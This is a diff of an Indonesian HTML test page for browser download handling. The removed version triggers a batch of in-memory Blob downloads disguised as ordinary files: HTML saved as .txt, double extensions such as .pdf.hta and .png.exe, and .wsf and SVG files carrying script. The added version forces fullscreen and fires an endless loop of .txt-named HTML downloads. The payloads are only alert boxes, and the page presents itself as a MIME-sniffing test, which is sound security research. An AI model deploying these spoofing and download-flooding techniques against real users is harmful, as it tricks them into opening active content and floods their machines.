@@ -1,434 +1,211 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Blob ObjectURL Multi-Download Spoofing</title>
-<style>
-body {
-font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-padding: 40px;
-background-color: #121212;
-color: #e0e0e0;
-max-width: 1000px;
-margin: 0 auto;
-}
-h1 {
-color: #ffffff;
-text-align: center;
-}
-p.deskripsi {
-text-align: center;
-color: #aaaaaa;
-margin-bottom: 30px;
-line-height: 1.6;
-}
-.panel {
-background-color: #1e1e1e;
-border: 1px solid #333;
-border-radius: 8px;
-padding: 25px;
-margin-bottom: 20px;
-}
-.panel h3 {
-margin-top: 0;
-color: #0078d4;
-}
-.tombol-utama {
-padding: 18px 30px;
-font-size: 18px;
-font-weight: bold;
-cursor: pointer;
-border-radius: 6px;
-border: none;
-background-color: #d83b01;
-color: white;
-width: 100%;
-margin: 10px 0;
-transition: background-color 0.2s;
-}
-.tombol-utama:hover {
-background-color: #b83202;
-}
-.tombol-utama:disabled {
-background-color: #555;
-cursor: not-allowed;
-}
-.tombol-sekunder {
-padding: 12px 20px;
-font-size: 14px;
-font-weight: bold;
-cursor: pointer;
-border-radius: 4px;
-border: none;
-background-color: #0078d4;
-color: white;
-width: 100%;
-margin: 6px 0;
-}
-.tombol-sekunder:hover {
-background-color: #005a9e;
-}
-.tombol-hijau {
-background-color: #107c10;
-}
-.tombol-hijau:hover {
-background-color: #0b5a0b;
-}
-.daftar-file {
-background: #0a0a0a;
-border: 1px solid #333;
-padding: 15px;
-border-radius: 6px;
-font-family: monospace;
-font-size: 13px;
-margin-top: 15px;
-}
-.daftar-file .item {
-padding: 8px;
-border-bottom: 1px solid #222;
-display: flex;
-justify-content: space-between;
-gap: 10px;
-align-items: center;
-}
-.daftar-file .item:last-child {
-border-bottom: none;
-}
-.daftar-file .aman {
-color: #4caf50;
-}
-.daftar-file .bahaya {
-color: #f44336;
-font-weight: bold;
-}
-.daftar-file .url-preview {
-color: #666;
-font-size: 11px;
-word-break: break-all;
-}
-.badge {
-font-size: 11px;
-padding: 2px 6px;
-border-radius: 3px;
-background: #333;
-color: #aaa;
-}
-.badge-bahaya {
-background: #d83b01;
-color: #fff;
-}
-.hasil {
-background: #000;
-border: 1px solid #333;
-padding: 15px;
-margin-top: 15px;
-font-family: monospace;
-font-size: 12px;
-color: #0f0;
-border-radius: 6px;
-white-space: pre-wrap;
-max-height: 300px;
-overflow-y: auto;
-}
-.statistik {
-display: grid;
-grid-template-columns: repeat(3, 1fr);
-gap: 10px;
-margin-top: 15px;
-}
-.stat-box {
-background: #0a0a0a;
-border: 1px solid #333;
-padding: 12px;
-border-radius: 6px;
-text-align: center;
-}
-.stat-box .angka {
-font-size: 24px;
-font-weight: bold;
-color: #0078d4;
-}
-.stat-box .label {
-font-size: 11px;
-color: #888;
-margin-top: 4px;
-}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Generator Berkas Blob & ObjectURL</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f8;
+      color: #222;
+      padding: 20px;
+    }
+    .panel {
+      background: #ffffff;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+      max-width: 600px;
+      margin: 40px auto;
+    }
+    /* Tampilan Fullscreen */
+    :fullscreen {
+      background: #111111 !important;
+      color: #00ff00 !important;
+      padding: 20px !important;
+      overflow-y: auto !important;
+      width: 100vw !important;
+      height: 100vh !important;
+    }
+    :-webkit-full-screen {
+      background: #111111 !important;
+      color: #00ff00 !important;
+      padding: 20px !important;
+      overflow-y: auto !important;
+    }
+    h2 {
+      margin-bottom: 10px;
+    }
+    p {
+      margin-bottom: 15px;
+      line-height: 1.5;
+    }
+    button {
+      width: 100%;
+      padding: 16px;
+      cursor: pointer;
+      border: none;
+      border-radius: 6px;
+      background: #d32f2f;
+      color: #ffffff;
+      font-weight: bold;
+      font-size: 16px;
+      box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: #b71c1c;
+    }
+    #status {
+      margin-top: 16px;
+      font-weight: bold;
+      color: #d32f2f;
+      padding: 12px;
+      background: #ffebee;
+      border-radius: 6px;
+      text-align: center;
+      border: 1px solid #ffcdd2;
+    }
+    #downloads {
+      margin-top: 20px;
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+      gap: 10px;
+    }
+    #downloads a {
+      display: block;
+      padding: 8px;
+      background: #212121;
+      color: #80df82;
+      text-decoration: none;
+      border-radius: 4px;
+      font-size: 12px;
+      text-align: center;
+      border: 1px solid #424242;
+      word-break: break-all;
+    }
+  </style>
 </head>
+
 <body>
+  <div class="panel" id="main-panel">
+    <h2>Generator Berkas Blob &amp; ObjectURL</h2>
+    <p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus (Uji MIME Sniffing).</p>
 
-<h1>Blob + ObjectURL Multi-Download Spoofing</h1>
-<p class="deskripsi">Semua berkas dibuat di memori lewat Blob, dijadikan blob: URL via URL.createObjectURL(), lalu dipicu unduhan berurutan dalam satu gesture user. File berbahaya disamarkan sebagai dokumen biasa.</p>
+    <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
-<div class="panel">
-<h3>Antrean Blob ObjectURL</h3>
-<div class="daftar-file" id="daftarFile"></div>
-<div class="statistik">
-<div class="stat-box">
-<div class="angka" id="statTotal">0</div>
-<div class="label">Total File</div>
-</div>
-<div class="stat-box">
-<div class="angka" id="statBahaya" style="color:#d83b01">0</div>
-<div class="label">Bahaya</div>
-</div>
-<div class="stat-box">
-<div class="angka" id="statUrl" style="color:#4caf50">0</div>
-<div class="label">ObjectURL Aktif</div>
-</div>
-</div>
-</div>
+    <div id="status" role="status">Sistem siap.</div>
+    <div id="downloads"></div>
+  </div>
 
-<div class="panel">
-<h3>Kontrol</h3>
-<button class="tombol-utama" id="btnMulai">⬇ Picu Multi-Download Blob (8 File)</button>
-<button class="tombol-sekunder" id="btnSatuPerSatu">Unduh Satu per Satu (Uji Manual)</button>
-<button class="tombol-sekunder" id="btnBuatUrl">Buat ObjectURL Saja (Tanpa Unduh)</button>
-<button class="tombol-sekunder tombol-hijau" id="btnBersihkan">Revoke Semua ObjectURL</button>
-</div>
+  <script>
+    const startBtn = document.getElementById("start-btn");
+    const statusDiv = document.getElementById("status");
+    const downloadsDiv = document.getElementById("downloads");
 
-<div class="panel">
-<h3>Log Eksekusi</h3>
-<div class="hasil" id="log">Menunggu aksi...</div>
-</div>
+    let activeUrls = [];
+    let isProcessing = false;
 
-<script>
-var daftarFileEl = document.getElementById('daftarFile');
-var logEl = document.getElementById('log');
-var logBuffer = [];
-var objectUrlAktif = [];
+    // Fungsi Sintesis Suara (TTS)
+    const speak = (message) => {
+      if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(message);
+        utterance.lang = 'id-ID';
+        utterance.rate = 1.0;
+        window.speechSynthesis.speak(utterance);
+      }
+    };
 
-function tulisLog(pesan) {
-var waktu = new Date().toLocaleTimeString('id-ID');
-logBuffer.push('[' + waktu + '] ' + pesan);
-logEl.textContent = logBuffer.join('\n');
-logEl.scrollTop = logEl.scrollHeight;
-}
+    // Mengubah fungsi pembuat data untuk menguji respon MIME Sniffing browser
+    const prepareMimeBlobAsync = (i) => {
+      return new Promise((resolve) => {
+        queueMicrotask(() => {
+          // Isi diisi dengan tag kode interaktif
+          const payloadText = "<html><body><h1>Test Vulnerability</h1><script>alert(document.origin)<\/script></body></html>";
+          
+          // Menyetel tipe konten sebagai HTML di memori internal Blob
+          const blob = new Blob([payloadText], { type: "text/html" });
+          const url = URL.createObjectURL(blob);
+          resolve({ id: i, url: url });
+        });
+      });
+    };
 
-function updateStatistik() {
-document.getElementById('statTotal').textContent = daftarUnduhan.length;
-document.getElementById('statBahaya').textContent = daftarUnduhan.filter(function(i) { return i.bahaya; }).length;
-document.getElementById('statUrl').textContent = objectUrlAktif.length;
-}
+    // Bagian pemicu unduhan memaksa ekstensi nama file menjadi teks biasa
+    const triggerInstantDownload = (fileData) => {
+      const link = document.createElement("a");
+      link.href = fileData.url;
+      
+      // Mengunci nama unduhan visual sebagai file teks (.txt)
+      link.download = `test-file-${fileData.id}.txt`;
+      link.textContent = `Blob #${fileData.id} (.txt)`;
+      
+      downloadsDiv.appendChild(link);
+      link.click();
+    };
 
-var payloadHtmlAktif = '<!DOCTYPE html>\n' +
-'<html>\n' +
-'<head><meta charset="UTF-8"><title>Dokumen</title></head>\n' +
-'<body style="background:#000;color:#0f0;font-family:monospace;padding:40px">\n' +
-'<h1 style="color:#f44336">FILE BERBAHAYA BERHASIL DIEKSEKUSI</h1>\n' +
-'<p>File ini dibuat lewat Blob ObjectURL.</p>\n' +
-'<p>Terlihat seperti dokumen biasa, tapi isinya HTML aktif.</p>\n' +
-'<p>Origin: <span id="o"></span></p>\n' +
-'<p>URL asal: <span id="u"></span></p>\n' +
-'<script>\n' +
-'document.getElementById("o").textContent = window.location.origin || "null (file lokal)";\n' +
-'document.getElementById("u").textContent = document.referrer || "(langsung dibuka)";\n' +
-'alert("Payload Blob aktif! Origin: " + (window.location.origin || "null"));\n' +
-'<\/script>\n' +
-'</body>\n' +
-'</html>';
+    // Perulangan Rekursif Asynchronous
+    const processLoop = async (counter) => {
+      if (!isProcessing) return;
 
-var payloadExeTiruan = "MZ\u0090\u0000\u0003Simulasi PE header.\n" +
-"File ini dibuat via Blob ObjectURL dengan MIME application/octet-stream.";
+      // Hasilkan Blob HTML dan URL
+      const fileData = await prepareMimeBlobAsync(counter);
+      activeUrls.push(fileData.url);
+      
+      // Picu unduhan file .txt
+      triggerInstantDownload(fileData);
 
-var payloadHta = '<html>\n' +
-'<head><title>HTA Blob</title></head>\n' +
-'<body>\n' +
-'<script language="VBScript">\n' +
-'MsgBox "HTA dari Blob berjalan!"\n' +
-'<\/script>\n' +
-'</body>\n' +
-'</html>';
+      statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
 
-var payloadWsf = '<job><script language="JScript">\n' +
-'WScript.Echo("WSF dari Blob ObjectURL");\n' +
-'<\/script></job>';
+      if (counter % 10 === 0) {
+        speak(`Proses mencapai ${counter} berkas.`);
+      }
 
-var payloadSvgAktif = '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">\n' +
-'<rect width="400" height="200" fill="#111"/>\n' +
-'<text x="20" y="100" fill="#0f0" font-family="monospace" font-size="14">SVG aktif - script tidak jalan di img</text>\n' +
-'<script>alert("SVG script jalan!");<\/script>\n' +
-'</svg>';
+      // Beri kesempatan ke Event Loop untuk merender UI sebelum iterasi berikutnya
+      setTimeout(() => processLoop(counter + 1), 0);
+    };
 
-var payloadTeksAman = "Ini dokumen teks biasa.\n" +
-"Tidak ada konten aktif di sini.\n" +
-"Data dummy untuk uji Blob ObjectURL.\n";
+    // Event Handler Tombol
+    startBtn.addEventListener("click", () => {
+      if (isProcessing) return;
 
-var daftarUnduhan = [
-{ nama: 'laporan_keuangan_2024.pdf', isi: payloadTeksAman, mime: 'application/pdf', bahaya: false, ket: 'Teks biasa' },
-{ nama: 'catatan_rapat.txt', isi: payloadTeksAman, mime: 'text/plain', bahaya: false, ket: 'Teks biasa' },
-{ nama: 'data_pelanggan.txt', isi: payloadHtmlAktif, mime: 'text/plain', bahaya: true, ket: 'HTML disamarkan .txt' },
-{ nama: 'invoice_desember.pdf.html', isi: payloadHtmlAktif, mime: 'text/html', bahaya: true, ket: 'Ekstensi ganda' },
-{ nama: 'screenshot_bukti.png.exe', isi: payloadExeTiruan, mime: 'application/octet-stream', bahaya: true, ket: 'Executable palsu' },
-{ nama: 'patch_security.txt.wsf', isi: payloadWsf, mime: 'text/xml', bahaya: true, ket: 'Windows Script File' },
-{ nama: 'gambar_produk.svg', isi: payloadSvgAktif, mime: 'image/svg+xml', bahaya: true, ket: 'SVG dengan script' },
-{ nama: 'laporan_audit.pdf.hta', isi: payloadHta, mime: 'application/hta', bahaya: true, ket: 'HTML Application' }
-];
+      // Bersihkan alokasi memori dari URL.createObjectURL sebelumnya
+      activeUrls.forEach(url => URL.revokeObjectURL(url));
+      activeUrls = [];
+      downloadsDiv.replaceChildren();
 
-function renderDaftar() {
-daftarFileEl.innerHTML = '';
-daftarUnduhan.forEach(function(item, index) {
-var kelas = item.bahaya ? 'bahaya' : 'aman';
-var label = item.bahaya ? '<span class="badge badge-bahaya">BAHAYA</span>' : '<span class="badge">aman</span>';
-var div = document.createElement('div');
-div.className = 'item';
-div.innerHTML = '<div><span class="' + kelas + '">' + (index + 1) + '. ' + item.nama + '</span><br>' +
-'<span class="url-preview">' + item.mime + ' — ' + item.ket + '</span></div>' +
-'<div>' + label + '</div>';
-daftarFileEl.appendChild(div);
-});
-}
+      speak("Mengaktifkan mode layar penuh.");
 
-function buatObjectUrl(item) {
-var blob = new Blob([item.isi], { type: item.mime });
-var url = URL.createObjectURL(blob);
-objectUrlAktif.push({ url: url, nama: item.nama, bahaya: item.bahaya });
-return url;
-}
+      // Permintaan Mode Fullscreen
+      const root = document.documentElement;
+      try {
+        if (root.requestFullscreen) {
+          root.requestFullscreen();
+        } else if (root.webkitRequestFullscreen) {
+          root.webkitRequestFullscreen();
+        } else if (root.mozRequestFullScreen) {
+          root.mozRequestFullScreen();
+        }
+        statusDiv.textContent = "Mengunci layar penuh...";
+      } catch (err) {
+        console.warn("Fullscreen tidak didukung atau ditolak:", err);
+      }
 
-function unduhViaAnchor(objectUrl, nama) {
-var a = document.createElement('a');
-a.href = objectUrl;
-a.download = nama;
-a.rel = 'noopener';
-a.style.display = 'none';
-document.body.appendChild(a);
-a.click();
-setTimeout(function() {
-if (a.parentNode) {
-a.parentNode.removeChild(a);
-}
-}, 200);
-}
-
-function picuUnduhanBerurutan() {
-logBuffer = [];
-logEl.textContent = '';
-tulisLog('=== MULAI MULTI-DOWNLOAD BLOB OBJECTURL ===');
-tulisLog('Setiap file akan dibuat Blob → ObjectURL → anchor click');
-tulisLog('Perhatikan dialog "Izinkan unduh banyak file?"');
-tulisLog('');
-
-var index = 0;
-var berhasil = 0;
-var gagal = 0;
-
-function langkah() {
-if (index >= daftarUnduhan.length) {
-tulisLog('');
-tulisLog('=== SELESAI ===');
-tulisLog('Berhasil dipicu: ' + berhasil + ' file');
-tulisLog('Gagal dipicu: ' + gagal + ' file');
-tulisLog('ObjectURL aktif: ' + objectUrlAktif.length);
-tulisLog('');
-tulisLog('Cek folder Download — buka file .txt / .pdf');
-tulisLog('Apakah muncul alert()? Kalau ya, sniffing berhasil.');
-updateStatistik();
-document.getElementById('btnMulai').disabled = false;
-return;
-}
-
-var item = daftarUnduhan[index];
-try {
-var objectUrl = buatObjectUrl(item);
-tulisLog('[' + (index + 1) + '/' + daftarUnduhan.length + '] Blob dibuat: ' + item.nama);
-tulisLog('    ObjectURL: ' + objectUrl.substring(0, 60) + '...');
-tulisLog('    MIME: ' + item.mime + ' | Ukuran: ' + item.isi.length + ' byte');
-
-unduhViaAnchor(objectUrl, item.nama);
-berhasil++;
-} catch (err) {
-gagal++;
-tulisLog('[' + (index + 1) + '] GAGAL: ' + err.message);
-}
-
-index++;
-setTimeout(langkah, 400);
-}
-
-document.getElementById('btnMulai').disabled = true;
-langkah();
-}
-
-function unduhSatuPerSatu() {
-logBuffer = [];
-logEl.textContent = '';
-tulisLog('Mode manual: klik "Unduh" untuk tiap file.');
-tulisLog('ObjectURL akan dibuat fresh setiap kali.');
-tulisLog('');
-
-daftarUnduhan.forEach(function(item, index) {
-var div = document.createElement('div');
-div.style.cssText = 'padding:10px;background:#0a0a0a;border:1px solid #333;margin:6px 0;border-radius:4px;display:flex;justify-content:space-between;align-items:center;gap:10px';
-var warna = item.bahaya ? '#f44336' : '#4caf50';
-div.innerHTML = '<div><span style="color:' + warna + ';font-weight:bold">' + (index + 1) + '. ' + item.nama + '</span><br>' +
-'<span style="color:#666;font-size:11px">' + item.mime + ' — ' + item.ket + '</span></div>';
-
-var btn = document.createElement('button');
-btn.textContent = 'Unduh';
-btn.style.cssText = 'padding:8px 16px;background:#0078d4;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold';
-btn.addEventListener('click', (function(it) {
-return function() {
-try {
-var url = buatObjectUrl(it);
-unduhViaAnchor(url, it.nama);
-tulisLog('Manual unduh: ' + it.nama + ' → ' + url.substring(0, 50) + '...');
-updateStatistik();
-} catch (e) {
-tulisLog('GAGAL: ' + e.message);
-}
-};
-})(item));
-
-div.appendChild(btn);
-logEl.appendChild(div);
-});
-}
-
-function buatUrlSaja() {
-logBuffer = [];
-logEl.textContent = '';
-tulisLog('Membuat ObjectURL tanpa memicu unduhan...');
-tulisLog('Berguna untuk inspeksi: buka blob: URL langsung di tab baru.');
-tulisLog('');
-
-daftarUnduhan.forEach(function(item, index) {
-try {
-var url = buatObjectUrl(item);
-tulisLog('[' + (index + 1) + '] ' + item.nama);
-tulisLog('    → ' + url);
-tulisLog('    Buka URL di atas di tab baru untuk lihat isi aslinya.');
-} catch (e) {
-tulisLog('GAGAL: ' + e.message);
-}
-});
-
-tulisLog('');
-tulisLog('Total ObjectURL aktif: ' + objectUrlAktif.length);
-updateStatistik();
-}
-
-function revokeSemua() {
-var jumlah = objectUrlAktif.length;
-objectUrlAktif.forEach(function(item) {
-URL.revokeObjectURL(item.url);
-});
-objectUrlAktif = [];
-tulisLog('Revoke ' + jumlah + ' ObjectURL. Memori dibersihkan.');
-updateStatistik();
-}
-
-document.getElementById('btnMulai').addEventListener('click', picuUnduhanBerurutan);
-document.getElementById('btnSatuPerSatu').addEventListener('click', unduhSatuPerSatu);
-document.getElementById('btnBuatUrl').addEventListener('click', buatUrlSaja);
-document.getElementById('btnBersihkan').addEventListener('click', revokeSemua);
-
-renderDaftar();
-updateStatistik();
-tulisLog('Siap. Klik "Picu Multi-Download Blob" untuk memulai uji.');
-tulisLog('Setiap file = Blob baru + ObjectURL baru + anchor.click()');
-</script>
-
+      // Jalankan proses setelah jeda singkat
+      setTimeout(() => {
+        isProcessing = true;
+        speak("Proses pembuatan berkas Blob dimulai.");
+        processLoop(1);
+      }, 300);
+    });
+  </script>
 </body>
 </html>
